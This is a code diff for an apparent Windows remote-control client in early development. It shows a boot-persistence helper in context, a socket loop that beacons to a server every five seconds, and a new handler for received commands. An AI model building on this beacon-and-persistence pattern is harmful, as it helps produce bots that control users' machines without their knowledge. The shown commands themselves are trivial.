@@ -33,6 +33,15 @@ void addToBoot(TCHAR *szPath) {
   RegCloseKey(newValue);
 }
 
+void handle(char *buff, BOOL *listen, BOOL *loop) {
+  if (strcmp(buff, "close") == 0) {
+    *listen = FALSE;
+    *loop = FALSE;
+  } else if (strcmp(buff, "hi") == 0) {
+    printf("helloooooooo\n");
+  }
+}
+
 int main() {
   G_UID = fingerprint::getUID();
 
@@ -55,24 +64,25 @@ int main() {
       ID);
 
 
-
   BOOL run = TRUE;
   char buf[BUFFER_LENGTH];
   int buffc;
 
   SOCKET sock;
   while (run) {
-    if (net::createSocket(&sock) == 0 && net::connect(&sock) == 0) {
+    net::createSocket(&sock);
+    if (net::connect(&sock) == 0) {
       net::PACKET * pck = net::newPacket((char*)"testing la vida locah!");
       net::write(&sock, pck);
       free(pck);
 
-      net::listen(&sock, buf, &buffc);
+      net::listen(&sock, &run, &handle);
     }
-    Sleep(5000);
+    closesocket(sock);
+    if (run) Sleep(5000);
   }
-
-  net::close(&sock);
+  net::close();
+  
 
 
   // fingerprint::test();
